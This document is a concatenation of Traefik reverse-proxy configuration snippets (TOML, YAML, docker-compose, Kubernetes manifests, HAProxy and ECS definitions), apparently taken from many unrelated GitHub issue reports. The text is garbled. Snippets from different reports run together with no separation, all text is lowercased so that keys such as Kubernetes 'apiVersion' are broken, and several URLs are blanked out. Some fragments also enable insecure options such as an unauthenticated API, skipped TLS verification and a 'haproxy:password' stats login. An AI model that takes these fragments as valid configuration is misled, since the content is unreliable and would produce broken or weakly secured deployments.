[global] checknewversion = true sendanonymoususage = true [entrypoints] [entrypoints.web] address = ":80" [entrypoints.web2] address = ":81" [entrypoints.websecure] address = ":443" [entrypoints.matrix-login] address = ":8448" [log] level = "warn" filepath = "/var/log/traefik/traefik.log" [accesslog] filepath = "/var/log/traefik/access.log" [api] insecure = false dashboard = true [ping] [providers.docker] endpoint = "unix:///var/run/docker.sock" exposedbydefault = false [certificatesresolvers.le.acme] email = "wk@mailstation.de" #caserver = " " storage = "/etc/traefik/acme/acme.json" [certificatesresolvers.le.acme.httpchallenge] # used during the challenge entrypoint = "web" [providers] # enable the file provider to define routers / middlewares / services in file [providers.file] directory = "/etc/traefik/dynamic" watch = true [pilot] token = "removedxxx"
all browser are running on windows
see original issue for environment / configuration
additional tests were run on: * kubernetes 1.16
* kubernetes 1.17
log: {level: info} entrypoints: http: {address: ':80'} https: {address: ':443'} certificatesresolvers: example: acme: email: admin@example.com storage: /etc/traefik/acme.json dnschallenge: provider: cloudflare delaybeforecheck: 15 providers: {file: {filename: /etc/traefik/provider.yml}}
```
using the traefik helm chart with these arguments as static configuration
```bash - --log.level=warn - --serverstransport.rootcas=/etc/certs/ca.crt - --serverstransport.insecureskipverify=true - --entrypoints.web.address=:8000 - --entrypoints.websecure.address=:8443 - --entrypoints.web.http.redirections.entrypoint.to=websecure - --entrypoints.websecure.http.tls.certresolver=main - --entrypoints.websecure.http.middlewares=default-secured@kubernetescrd - --api - --api.insecure - --api.dashboard=true - --accesslog - --providers.kubernetesingress=true - --providers.kubernetescrd=true - --certificatesresolvers.main.acme.storage=/data/acme.json - --certificatesresolvers.main.acme.email=redacted - --certificatesresolvers.main.acme.dnschallenge=true - --certificatesresolvers.main.acme.dnschallenge.provider=cloudflare - --certificatesresolvers.main.acme.keytype=ec256 - --metrics.influxdb=true - --metrics.influxdb.address=redacted - --metrics.influxdb.database=redacted - --metrics.influxdb.username=redacted - --metrics.influxdb.password=redacted - --metrics.influxdb.protocol=http
``` and here is an example of one of my external service yamls
kind: service
apiversion: v1
metadata: name: diskstation labels: app.kubernetes.io/name: diskstation
spec: type: clusterip ports: - name: https port: 5001 targetport: https
apiversion: v1
kind: endpoints
metadata: name: diskstation labels: app.kubernetes.io/name: diskstation
subsets: - addresses: - ip: redacted ports: - name: https port: 5001
apiversion: networking.k8s.io/v1
kind: ingress
metadata: name: diskstation labels: app.kubernetes.io/name: diskstation annotations: ingress.kubernetes.io/protocol: https
spec: rules: - host: redacted http: paths: - path: / pathtype: implementationspecific backend: service: name: diskstation port: name: https
entrypoints: web: address: :80 websec: address: :443 providers: file: filename: traefik.dyn.yaml pilot: token: "****" experimental: devplugin: gopath: c:\\users\\piper\\go modulename: github.com/pipe01/plugin-h2push
``` dynamic:
http: services: webserver: loadbalancer: servers: - url: \' routers: my-router: entrypoints: - web - websec rule: "host(`localhost`)" service: webserver tls: true middlewares: - push middlewares: push: plugin: dev: files: - url: url1 match: match1
using docker-compose latest & traefik latest ``` - --log.level=info - --log.filepath=etc/var/log/traefik.log - --accesslog.filepath=/var/log/access.log - --accesslog.filters.statuscodes=400-499 - --providers.docker=true - --providers.docker.exposedbydefault=false - --providers.docker.network=reverseproxy - "--metrics.prometheus=true" - "--metrics.prometheus.buckets=0.1,0.3,1.2,5.0" - --api - --api.insecure=true - --entrypoints.traefik.address=:8888 - --entrypoints.web.address=:80 - --entrypoints.web.http.redirections.entrypoint.to=websecure - --entrypoints.web.http.redirections.entrypoint.scheme=https - --entrypoints.websecure.address=:443 - --entrypoints.websecure.http.tls.certresolver=myresolver - --certificatesresolvers.myresolver.acme.dnschallenge=true - --certificatesresolvers.myresolver.acme.email=xxxxxxxxx@xxxx.com - --certificatesresolvers.myresolver.acme.caserver= - --certificatesresolvers.myresolver.acme.storage=acme.json - --certificatesresolvers.myresolver.acme.dnschallenge.provider=cloudflare ``` my labels on the traefik container: ``` traefik.enable: "true" traefik.http.routers.traefik.rule: host(`traefik.xxxxxxx`) traefik.http.routers.traefik.entrypoints: websecure traefik.http.routers.traefik.service: api@internal # chain global & local middleware traefik.http.routers.traefik.middlewares: traefik-chain traefik.http.middlewares.traefik-chain.chain.middlewares: main-chain@docker,traefik-auth # <--- this order is causing the issue, reverse it for workaround # "local" auth settings traefik.http.middlewares.traefik-auth.basicauth.users: admin:$$xxxxxxxxxxxxxx # listen port traefik.http.services.traefik.loadbalancer.server.port: 8080
``` my labels on the error-pages container: ``` traefik.enable: "true" # use as "fallback" for any non-registered services (with priority below normal)+ traefik.http.routers.error-pages.rule: hostregexp(`{host:.+}`) traefik.http.routers.error-pages.priority: 1 traefik.http.routers.error-pages.entrypoints: websecure # define main chain globally traefik.http.routers.error-pages.middlewares: main-chain@docker # "global" chain settings traefik.http.middlewares.main-chain.chain.middlewares: error-pages@docker,main-ratelimit@docker # "global" rate limiting settings traefik.http.middlewares.main-ratelimit.ratelimit.average: 200 traefik.http.middlewares.main-ratelimit.ratelimit.period: 1m traefik.http.middlewares.main-ratelimit.ratelimit.burst: 100 # "global" error middleware settings traefik.http.middlewares.error-pages.errors.status: 400-599 traefik.http.middlewares.error-pages.errors.service: error-pages@docker traefik.http.middlewares.error-pages.errors.query: /{status}.html # listen port traefik.http.services.error-pages.loadbalancer.server.port: 8080
running traefik with docker on windows with the wsl2 backend (issue persists when running the windows binary)
entrypoints: web: address: :80 providers: file: filename: /etc/traefik/traefik.dyn.yaml log: level: debug pilot: token: **** experimental: devplugin: gopath: /gopath modulename: github.com/pipe01/plugin-h2push
``` dynamic:
http: services: webserver: loadbalancer: servers: - url: \' routers: my-router: rule: "path(`/`)" service: webserver middlewares: - push middlewares: push: plugin: dev: files: - url: url1 match: match1
```
```toml [http.services.nginx] [http.services.nginx.loadbalancer] [[http.services.nginx.loadbalancer.servers]] url = " " [http.routers.nginx] entrypoints = ["web", "web-secure"] priority = 10 service = "nginx" rule = "pathprefix(`/test`)" middlewares = ["whitelist"] [http.middlewares.whitelist.ipwhitelist] sourcerange = ["0.0.0.0/0", "::/0"]
```
```yaml traefik: image: traefik volumes: - /var/run/docker.sock:/var/run/docker.sock - ${config_folder}/traefik:/data ports: - 9080:80 - 9443:443 extra_hosts: - host.docker.internal:x.x.x.x restart: always command: - --accesslog=true - --api - --providers.file.directory=/data - --providers.file.watch=true - --providers.docker=true - --providers.docker.exposedbydefault=false - --providers.docker.defaultrule=host(`{{ normalize .name | replace "-${compose_project_name}" ".${domain}"}}`) - --entrypoints.web.address=:80 - --entrypoints.websecure.address=:443 - --certificatesresolvers.default.acme.httpchallenge=true - --certificatesresolvers.default.acme.httpchallenge.entrypoint=web - --certificatesresolvers.default.acme.storage=/data/acme.json - --entrypoints.websecure.http.tls.certresolver=default - --entrypoints.websecure.http.middlewares=sts@docker - --entrypoints.web.http.redirections.entrypoint.to=websecure - --serverstransport.insecureskipverify=true labels: - traefik.enable=true - traefik.http.routers.traefik.middlewares=auth - traefik.http.routers.traefik.entrypoints=websecure - traefik.http.routers.traefik.service=api@internal # global settings - traefik.http.middlewares.sts.headers.stspreload=true - traefik.http.middlewares.sts.headers.stsseconds=31536000
```
global: checknewversion: true sendanonymoususage: false certificatesresolvers: prodssl: acme: email: "f@lex.la" storage: "/acme/prod.json" tlschallenge: {} providers: docker: swarmmode: true watch: true network: "traefik" exposedbydefault: false file: watch: true filename: "/etc/traefik/traefik.yml" api: dashboard: true entrypoints: web: address: :80 http: redirections: entrypoint: to: websecure scheme: https websecure: address: :443 http: middlewares: - secheaders@file - cache@file - compress@file metrics: address: ":8082" metrics: prometheus: buckets: - 0.1 - 0.3 - 1.2 - 5 entrypoint: metrics http: middlewares: auth: basicauth: users: - "lex:xxx" secheaders: headers: sslredirect: true stsincludesubdomains: true stspreload: true stsseconds: 31536000 cache: plugin: plugin-simplecache: path: /tmp compress: compress: {} experimental: pilot: token: "xxx" plugins: plugin-simplecache: modulename: "github.com/containous/plugin-simplecache" version: "v0.1.1" ``` my env is pretty similar to this repo:
branch to reproduce #l7
apiversion: traefik.containo.us/v1alpha1
kind: tlsstore
metadata: name: default namespace: ingress
spec: defaultcertificate: secretname: tls-cert
```
providers: file: directory: /etc/traefik/dynamic docker: exposedbydefault: false network: traefik_public swarmmode: true watch: true entrypoints: web: address: ":80" http: redirections: entrypoint: to: websecure websecure: address: ":443" http: tls: certresolver: letsencrypt metrics: address: ":8082" certificatesresolvers: letsencrypt: acme: email: me@example.com storage: /letsencrypt/acme.json httpchallenge: entrypoint: web api: insecure: true metrics: prometheus: entrypoint: metrics accesslog: filepath: /logs/access.log fields: defaultmode: keep headers: defaultmode: keep log: filepath: /logs/traefik.log level: debug experimental: pilot: token: ********-****-****-****-************
--kubernetes
--loglevel=fatal
``` ```toml insecureskipverify = true defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" #[entrypoints.http.redirect] # entrypoint = "https" #[entrypoints.http.forwardedheaders] # trustedips = ["10.1.0.0/16", "172.20.0.0/16", "192.168.1.3"] [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [accesslog] #accesslog -> stdout #filepath = "/logs/traefik.access.log" #bufferingsize = 500 [metrics] [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.3,1.2,5.0]
``` k8s limit config
args: - '--configfile=/config/traefik.toml' - '--api' - '--kubernetes' - '--loglevel=fatal' ports: - name: http hostport: 80 containerport: 80 protocol: tcp - name: https hostport: 443 containerport: 443 protocol: tcp - name: admin hostport: 8080 containerport: 8080 protocol: tcp resources: limits: cpu: '7' memory: 13gi requests: cpu: '4' memory: 10gi volumemounts: - name: ssl mountpath: /ssl - name: config mountpath: /config - name: traefik-ingress-controller-token-d4wfj readonly: true mountpath: /var/run/secrets/kubernetes.io/serviceaccount terminationmessagepath: /dev/termination-log terminationmessagepolicy: file imagepullpolicy: ifnotpresent securitycontext: capabilities: add: - net_bind_service drop: - all restartpolicy: always terminationgraceperiodseconds: 60 dnspolicy: none nodeselector: node-role.kubernetes.io/traefik: '' serviceaccountname: traefik-ingress-controller serviceaccount: traefik-ingress-controller nodename: vm10-xx-xx-xxx hostnetwork: true securitycontext: {} imagepullsecrets: - name: yzjharborkey affinity: nodeaffinity: requiredduringschedulingignoredduringexecution: nodeselectorterms: - matchfields: - key: metadata.name operator: in values: - vm10-xx-xx-xxx schedulername: default-scheduler tolerations: - operator: exists effect: noschedule - key: node.kubernetes.io/not-ready operator: exists effect: noexecute - key: node.kubernetes.io/unreachable operator: exists effect: noexecute - key: node.kubernetes.io/disk-pressure operator: exists effect: noschedule - key: node.kubernetes.io/memory-pressure operator: exists effect: noschedule - key: node.kubernetes.io/pid-pressure operator: exists effect: noschedule - key: node.kubernetes.io/unschedulable operator: exists effect: noschedule - key: node.kubernetes.io/network-unavailable operator: exists effect: noschedule priorityclassname: system-node-critical
defaultentrypoints = ["http"]
debug = false
loglevel = "warn"
insecureskipverify = true
[global] checknewversion = false
[entrypoints] [entrypoints.http] address = ":80"
[web] address = ":8090"
[api] insecure = true dashboard = true debug = false
[kubernetes]
[providers.kubernetesingress] endpoint = " "
entrypoint = "http"
[log] filepath = "/data/traefik.log" level = "warn"
[accesslog] filepath = "/data/access.log" [accesslog.filters] statuscodes = ["400-499", "500-504"] retryattempts = true minduration = "10ms"
ecs task definition:
[ { "name": "gateway", "image": "traefik:v2.3", "essential": true, "logconfiguration": { "logdriver": "awslogs", "options": { "awslogs-group": "/aws/ecs/reportportal/traefik", "awslogs-region": "us-east-1", "awslogs-create-group": "true", "awslogs-stream-prefix": "ecs" } }, "dependson": null, "entrypoint": null, "command": [ "--providers.ecs", "--providers.ecs.autodiscoverclusters=false", "--providers.ecs.clusters=test-cluster", "--providers.ecs.exposedbydefault=false", "--entrypoints.web.address=:8080", "--entrypoints.traefik.address=:8081", "--api.dashboard=true", "--api.insecure=true" ], "cpu": 512, "memory": 400, "dnssearchdomains": null, "linuxparameters": null, "resourcerequirements": null, "portmappings": [ { "containerport": 8080, "hostport": 8080, "protocol": "tcp" }, { "containerport": 8081, "hostport": 8081, "protocol": "tcp" } ], "ulimits": null, "dnsservers": null, "mountpoints": [ { "sourcevolume": "docker-socket", "readonly": false, "containerpath": "/var/run/docker.sock" } ], "workingdirectory": null, "dockersecurityoptions": null, "memoryreservation": null, "volumesfrom": null, "stoptimeout": null, "starttimeout": null, "firelensconfiguration": null, "disablenetworking": null, "interactive": null, "healthcheck": null, "links": null, "hostname": null, "extrahosts": null, "pseudoterminal": null, "user": null, "readonlyrootfilesystem": null, "dockerlabels": null, "systemcontrols": null, "privileged": null }
kind: deployment
apiversion: apps/v1
metadata: namespace: default name: traefik labels: app: traefik spec: replicas: 3 selector: matchlabels: app: traefik template: metadata: labels: app: traefik spec: serviceaccountname: traefik-ingress-controller containers: - name: traefik image: traefik:v2.0 args: - --api.insecure - --api - --api.dashboard=true - --accesslog - --entrypoints.web.address=:8000 - --entrypoints.websecure.address=:4443 - --providers.kubernetescrd - --certificatesresolvers.default.acme.httpchallenge=true - --certificatesresolvers.default.acme.tlschallenge=true - --certificatesresolvers.default.acme.email=xxx@xxx.com.ar - --certificatesresolvers.default.acme.storage=acme4.json ports: - name: web containerport: 8000 - name: websecure containerport: 4443 - name: admin containerport: 8080 resources: limits: cpu: 3 memory: 8192mi requests: cpu: 400m memory: 100mi
``` ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: max-limit
spec: buffering: maxrequestbodybytes: 200000000
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: limits-middleware
spec: chain: middlewares: - name: prefix-middleware - name: limit
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: creationtimestamp: null name: prefix-middleware
spec: stripprefix: prefixes: - /stripit
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: mem-limit
spec: buffering: memrequestbodybytes: 2000000000
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: retry-limit
spec: buffering: retryexpression: "isnetworkerror() && attempts() < 5"
haproxy node is 10.1.1.1 traefik node is 10.1.1.10 *static conf* ```yml
entrypoints: ## pop3 0110_pop3: address: ":110" proxyprotocol: trustedips: - "10.0.0.0/8" forwardedheaders: trustedips: - "10.0.0.0/8" providers: file: watch: true directory: /etc/traefik/dynanmic docker: endpoint: "tcp://socket:2375" swarmmode: true exposedbydefault: false network: public api: dashboard: true insecure: false # default: false debug: false # default: false certificatesresolvers: le: acme: email: xxx storage: /acme.json dnschallenge: provider: xxx delaybeforecheck: 10 log: level: debug
``` port 110 is exposed in host mode in the `docker-compose.yml` file: ```yml
## pop3 - target: 110 published: 110 protocol: tcp mode: host
``` *haproxy conf* ```haproxy
global log /dev/log local0 log /dev/log local1 notice chroot /var/lib/haproxy stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners stats timeout 30s user haproxy group haproxy daemon # see: #server=haproxy&server-version=2.0.3&config=intermediate # modern configuration ssl-default-bind-ciphersuites tls_aes_128_gcm_sha256:tls_aes_256_gcm_sha384:tls_chacha20_poly1305_sha256 ssl-default-bind-options no-sslv3 no-tlsv10 no-tlsv11 no-tlsv12 no-tls-tickets ssl-default-server-ciphersuites tls_aes_128_gcm_sha256:tls_aes_256_gcm_sha384:tls_chacha20_poly1305_sha256 ssl-default-server-options no-sslv3 no-tlsv10 no-tlsv11 no-tlsv12 no-tls-tickets defaults log global mode http option httplog timeout connect 1s timeout client 20s timeout server 20s timeout client-fin 20s timeout tunnel 1h errorfile 400 /etc/haproxy/errors/400.http errorfile 403 /etc/haproxy/errors/403.http errorfile 408 /etc/haproxy/errors/408.http errorfile 500 /etc/haproxy/errors/500.http errorfile 502 /etc/haproxy/errors/502.http errorfile 503 /etc/haproxy/errors/503.http errorfile 504 /etc/haproxy/errors/504.http listen stats bind :32700 stats enable stats uri / stats hide-version stats auth haproxy:password stats refresh 1s ## pop3
frontend 0110 bind *:110 mode tcp option tcplog default_backend 0110 backend 0110 balance roundrobin mode tcp option redispatch option tcp-check tcp-check connect send-proxy server m10 10.1.1.10:110 check send-proxy-v2 fall 3 rise 2
here is my redis config stored in `/etc/traefik/dynamic/`
[tcp] # add the router [tcp.routers] [tcp.routers.redis-router] entrypoints = ["redis"] rule = "hostsni(`some.domain.tld`)" service = "redis-service" [tcp.routers.redis-router.tls] # add the service [tcp.services] [tcp.services.redis-service] [tcp.services.redis-service.loadbalancer] [[tcp.services.redis-service.loadbalancer.servers]] address = "<external ip of different server>:6379"
here is my traefik entrypoint/provider config stored in `/etc/traefik/`
[entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [entrypoints.redis] address = ":6379"
[providers.docker] [providers.file] directory = "/etc/traefik/dynamic"
[api] dashboard = true
[tls] [tls.stores] [tls.stores.default] [tls.stores.default.defaultcertificate] certfile = "/etc/traefik/ssl/cert.pem" keyfile = "/etc/traefik/ssl/privkey.pem" [[tls.certificates]] certfile = "/etc/traefik/ssl/cert.pem" keyfile = "/etc/traefik/ssl/privkey.pem" ```
docker-compose file:
version: "3.7" services: <some service>: image: traefik:v2.2.8 ports: - "80:80" - "443:443" - "6379:6379" volumes: - /var/run/docker.sock:/var/run/docker.sock - /path/to/traefik:/etc/traefik - /path/to/fullchain.pem:/etc/traefik/ssl/cert.pem - /path/to/privkey.pem:/etc/traefik/ssl/privkey.pem labels: - "traefik.http.routers.dashboard.rule=host(`some.domain.tld`)" - "traefik.http.routers.dashboard.service=api@internal" - "traefik.http.routers.dashboard.middlewares=auth" - "traefik.http.middlewares.auth.basicauth.users=<something>" - "traefik.http.routers.dashboard.entrypoints=websecure" - "traefik.http.routers.dashboard.tls=true"
#### traefik.yml ```yaml
log: level: debug serverstransport: insecureskipverify: true #accesslog: {} api: dashboard: true providers: docker: swarmmode: true exposedbydefault: false swarmmoderefreshseconds: 30 network: web file: directory: /dynamic/ watch: true entrypoints: web: address: ":80" websecure: address: ":443"
``` #### docker-compose.yml
version: \'3.8\' services: keycloak: image: jboss/keycloak ports: - target: 8443 published: 8443 protocol: tcp mode: ingress volumes: - ./https:/etc/x509/https - ./tls:/etc/x509/tls environment: - keycloak_loglevel=debug deploy: replicas: 1 placement: constraints: - "node.hostname==host" labels: - "traefik.enable=true" - "traefik.tcp.routers.tcp_keycloak.entrypoints=websecure" - "traefik.tcp.routers.tcp_keycloak.tls.passthrough=true" - "traefik.tcp.routers.tcp_keycloak.rule=hostsni(`auth.mydomain.de`)" - "traefik.tcp.services.tcp_keycloak.loadbalancer.server.port=8443" networks: - web command: ["-b", "0.0.0.0", "-dkeycloak.profile.feature.docker=enabled", "-dkeycloak.profile.feature.upload_scripts=enabled"]
```yaml request-limit: ratelimit: average: 100 burst: 50 period: 1s sourcecriterion: requesthost: true ipstrategy: depth: 1
traefik --providers.ecs.clusters traefik-demo --api.insecure --log-level debug
``` on fargate ecs
```toml ```
api: dashboard: true entrypoints: http: address: ":80" https: address: ":443" tls: options: minversion: versiontls12 ciphersuites: - "tls_ecdhe_rsa_with_aes_128_gcm_sha256" - "tls_ecdhe_rsa_with_aes_256_gcm_sha384" - "tls_ecdhe_rsa_with_chacha20_poly1305" providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false defaultrule: "host(`{{ index .labels \\"com.docker.compose.service\\"}}.example.com`)" network: proxy file: directory: "/configs" watch: true certificatesresolvers: dns: acme:
# caserver: email: cert@example.com storage: acme.json dnschallenge: provider: cloudflare resolvers: - "1.1.1.1:53" - "1.0.0.1:53" serverstransport: insecureskipverify: true accesslog: filepath: "/access.log" log: level: debug
version: \'3\' services: traefik: image: traefik:latest container_name: traefik restart: unless-stopped networks: - proxy ports: - 80:80 - 443:443 volumes: - /etc/localtime:/etc/localtime:ro - /var/run/docker.sock:/var/run/docker.sock:ro - ./data/traefik.yml:/traefik.yml:ro - ./data/configs:/configs:ro - ./data/acme.json:/acme.json - ./data/access.log:/access.log environment: - cf_dns_api_token=<redacted> labels: - "traefik.enable=true" - "traefik.http.middlewares.traefik-auth.basicauth.users=admin:<redacted>" - "traefik.http.middlewares.traefik-https-redirect.redirectscheme.scheme=https" - "traefik.http.middlewares.stsheaders.headers.stsseconds=15768000" - "traefik.http.middlewares.stsheaders.headers.stsincludesubdomains=true" - "traefik.http.routers.traefik-secure.entrypoints=https" - "traefik.http.routers.traefik-secure.middlewares=traefik-auth,stsheaders,internal-ipwhitelist@file" - "traefik.http.routers.traefik-secure.tls=true" - "traefik.http.routers.traefik-secure.service=api@internal" - "traefik.http.routers.traefik-secure.tls.certresolver=dns" - "traefik.http.routers.traefik-secure.tls.domains[0].main=example.com" - "traefik.http.routers.traefik-secure.tls.domains[0].sans=*.example.com" networks: proxy: external: true
linux docker 5.4.0-40-generic #44-ubuntu smp tue jun 23 00:01:04 utc 2020 x86_64 x86_64 x86_64 gnu/linux
client: version: 19.03.11 api version: 1.40 go version: go1.13.12 git commit: dd360c7 built: mon jun 8 20:23:26 2020 os/arch: linux/amd64 experimental: false server: engine: version: 19.03.11 api version: 1.40 (minimum version 1.12) go version: go1.13.12 git commit: 77e06fd built: mon jun 8 20:24:59 2020 os/arch: linux/amd64 experimental: false containerd: version: v1.2.13 gitcommit: 7ad184331fa3e55e52b890ea95e65ba581ae3429 runc: version: 1.0.0-rc10 gitcommit: docker-init: version: 0.18.0 gitcommit: fec3683
```bash - --log=true - --log.level=debug - --accesslog=true - --accesslog.filepath=/var/log/traefik/access.log - --accesslog.filters.statuscodes=400-499 - --providers.docker.exposedbydefault=false - --entrypoints.web.address=:80 - --entrypoints.web-secure.address=:443 - --entrypoints.backend.address=:50077 - --global.sendanonymoususage=false - --global.checknewversion=false - --serverstransport.insecureskipverify=true - --providers.docker.swarmmode=true - --providers.docker=true - --providers.docker.endpoint=unix:///var/run/docker.sock - --providers.docker.network=some_net - --providers.file.directory=/etc/traefik/dynamic - --providers.file.watch=true - --certificatesresolvers.letsencrypt.acme.email=someprivateinfo - --certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json - --certificatesresolvers.letsencrypt.acme.tlschallenge=true - --certificatesresolvers.letsencrypt.acme.keytype=rsa4096 ``` ```toml
[http] # https redirect [http.middlewares] [http.middlewares.redirect.redirectscheme] scheme = "https" permanent = true # security-headers [http.middlewares.security-headers.headers] accesscontrolmaxage = 100 addvaryheader = true browserxssfilter = true contenttypenosniff = true forcestsheader = true sslredirect = true stsincludesubdomains = true referrerpolicy = "same-origin" featurepolicy = "vibrate \'self\'" stsseconds = 315360000 [http.middlewares.response-headers.headers.customresponseheaders] x-powered-by = "memyselfandi" server = "memyselfandi" x-frame-options = "sameorigin"
# set-cookie = "set-cookie: samesite=strict; httponly; secure" [http.middlewares.ratelimit-ddos.ratelimit] average = 1000 burst = 500
################################################################
# configuration sample for traefik v2.
################################################################ ################################################################
# global configuration
################################################################ [global] checknewversion = false sendanonymoususage = false ################################################################
# entrypoints configuration
################################################################ # entrypoints definition
# default: [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.traefik] address = ":8082" ################################################################
# traefik logs configuration
################################################################ # traefik logs
# enabled by default and log to stdout
[log] # log level # # optional # default: "error" # level = "debug" # sets the filepath for the traefik log
if not specified, stdout will be used
# intermediate directories are created if necessary
# # optional # default: os.stdout # filepath = "/var/log/traefik/traefik.log" # format is either "json" or "common"
# # optional # default: "common" # # format = "json" ################################################################
# access logs configuration
################################################################ # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
# [accesslog] # sets the file path for the access log
if not specified, stdout will be used
# intermediate directories are created if necessary
# # optional # default: os.stdout # # filepath = "/path/to/log/log.txt" # format is either "json" or "common"
# # optional # default: "common" # # format = "json" ################################################################
# api and dashboard configuration
################################################################ # enable api and dashboard
[api] # enable the api in insecure mode # # optional # default: false # insecure = true # enabled dashboard # # optional # default: true # dashboard = true ################################################################
# ping configuration
################################################################ # enable ping
[ping] # name of the related entry point # # optional # default: "traefik" # # entrypoint = "traefik" ################################################################
# file providers
################################################################ [providers] [providers.file] directory = "/etc/traefik/conf.d" watch = true ```
docker installation on ubuntu 20 lts
here is my `docker-compose`: ```yml
version: '3.7' services: # a cool reverse-proxy / load balancer traefik: # the official v2 traefik docker image image: traefik:v2.2 container_name: traefik security_opt: - no-new-privileges:true restart: always env_file: # variables that will be passed to the container - .provider.env volumes: # so that traefik can listen to the docker events - /var/run/docker.sock:/var/run/docker.sock:ro # tls-certificates path (tls) - ./letsencrypt:/letsencrypt ports: # http - ${http_port}:80 # https - ${https_port}:443 command: ########################################### # static configuration harnessing cli # ########################################### # activate dashboard
- --api.dashboard=true # log level set to traefik logs
(default: error) - --log.level=${debug_level} # enable docker backend with default settings
- --providers.docker=true # do not expose containers by default
- --providers.docker.exposedbydefault=false # default docker network used
- --providers.docker.network=proxy # --entrypoints.<name>.address for ports # 80 (i.e., name = webinsercure) - --entrypoints.webinsecure.address=:80 # redirection to https - --entrypoints.webinsecure.http.redirections.entrypoint.to=websecure - --entrypoints.webinsecure.http.redirections.entrypoint.scheme=https # 443 (i.e., name = websecure) - --entrypoints.websecure.address=:443 # dns certificatesresolvers w/ let's encrypt # acme v2 supports wildcard certificates
# wildcard certificates can only be generated through a dns-01 challenge
- --certificatesresolvers.leresolver.acme.dnschallenge=true - --certificatesresolvers.leresolver.acme.dnschallenge.provider=godaddy - --certificatesresolvers.leresolver.acme.dnschallenge.delaybeforecheck=0 # email address used for registration
- --certificatesresolvers.leresolver.acme.email=${certificates_email} # certificates storage - --certificatesresolvers.leresolver.acme.storage=/letsencrypt/acme.json # tls certificatesresolvers w/ let's encrypt (for other domains such as science4fun.org) # see here: # use tls challenge for `tlsleresolver` - --certificatesresolvers.tlsleresolver.acme.tlschallenge=true # email address used for registration
- --certificatesresolvers.tlsleresolver.acme.email=${certificates_email} # certificates storage (not sure if you can store all the certs in the same file) # let's use a new one for the moment - --certificatesresolvers.tlsleresolver.acme.storage=/letsencrypt/acme_tls.json networks: # this is the network over which traefik communicates with other containers
- proxy labels: ################################################ # dynamic configuration with docker labels # ################################################ # you can tell traefik to consider (or not) this container by setting traefik.enable to true or false
# we need it for the dashboard traefik.enable: true # dashboard traefik.http.routers.traefik.rule: host(`traefik.foo.org`) traefik.http.routers.traefik.service: api@internal traefik.http.routers.traefik.tls.certresolver: leresolver traefik.http.routers.traefik.tls.domains[0].main: foo.org traefik.http.routers.traefik.tls.domains[0].sans: '*.foo.org' traefik.http.routers.traefik.entrypoints: websecure # declaring the user list # # note=all dollar signs in the hash need to be doubled for escaping
# to create user:password pair, it's possible to use this command: # echo $(htpasswd -nb user password) and then save user and password in # the .env file traefik.http.routers.traefik.middlewares: traefik-auth traefik.http.middlewares.traefik-auth.basicauth.users: ${dashboard_username}:${dashboard_password} my-test-app: image: containous/whoami networks: # this is the network over which traefik communicates with other containers
- proxy labels: traefik.enable: true traefik.http.routers.my-test-app.rule: host(`test.foo.org`) traefik.http.routers.my-test-app.entrypoints: websecure traefik.http.routers.my-test-app.tls.certresolver: leresolver traefik.http.routers.my-test-app.tls.domains[0].main: foo.org traefik.http.routers.my-test-app.tls.domains[0].sans: '*.foo.org' networks: proxy: external: true
docker ```yml traefik: image: traefik:latest container_name: traefik restart: always command: # - "--log.level=debug" - "--api=true" - "--api.dashboard=true" - "--accesslog=true" - "--metrics=true" - "--metrics.prometheus=true" - "--metrics.prometheus.manualrouting=true" - "--providers.docker=true" - "--providers.docker.exposedbydefault=false" - "--entrypoints.web.address=:80" - "--entrypoints.websecure.address=:443" - "--certificatesresolvers.leresolver.acme.tlschallenge=true" - "--certificatesresolvers.leresolver.acme.email=none@uel.br" - "--certificatesresolvers.leresolver.acme.storage=/letsencrypt/acme.json" ports: - "80:80" - "443:443" # - "8080:8080" volumes: - "./letsencrypt:/letsencrypt" - "/var/run/docker.sock:/var/run/docker.sock:ro" labels: # global redirect to https - "traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https" - "traefik.http.routers.http-catchall.rule=hostregexp(`{host:.+}`)" - "traefik.http.routers.http-catchall.entrypoints=web" - "traefik.http.routers.http-catchall.middlewares=redirect-to-https" # redict-from-old-url - "traefik.http.middlewares.redict-from-old-url.redirectregex.permanent=true" - "traefik.http.middlewares.redict-from-old-url.redirectregex.regex=^ " - "traefik.http.middlewares.redict-from-old-url.redirectregex.replacement= {1}" - "traefik.http.routers.catch-old-url.rule=host(`oldname.uel.br`)" - "traefik.http.routers.catch-old-url.entrypoints=websecure" - "traefik.http.routers.catch-old-url.tls.certresolver=leresolver" - "traefik.http.routers.catch-old-url.middlewares=redict-from-old-url"
```
using kubernetes 1.14 with crd provider
- provider: docker (could replicate this on swarm and non-swarm equally)
- platform: linux amd64 (swarm: coreos, non-swarm: arch linux)
- [i have prepared an isolated test environment.]( it contains an applicable example configuration as described above, which can be set up and run to replicate the behavior
### possibly related issues: - #4081 though i don't know if it covers this specific case of two wildcard certificates covering different subdomain layers
k3s v1.18.4+k3s1 running on 3 nodes (master + 2 workers, calcio + wireguard networking) reconfiguring to use nodeport instead of via traefik solves the packetloss issue.
see above
tls certificates are created using mkcert
traefik/traefik.yml
global: checknewversion: false sendanonymoususage: false
accesslog: {}
log: level: debug entrypoints: web: address: ':80' web-secure: address: ':443' api: dashboard: true providers: file: directory: /etc/traefik/conf watch: true docker: endpoint: unix:///var/run/docker.sock exposedbydefault: false
traefik/conf/services.yml
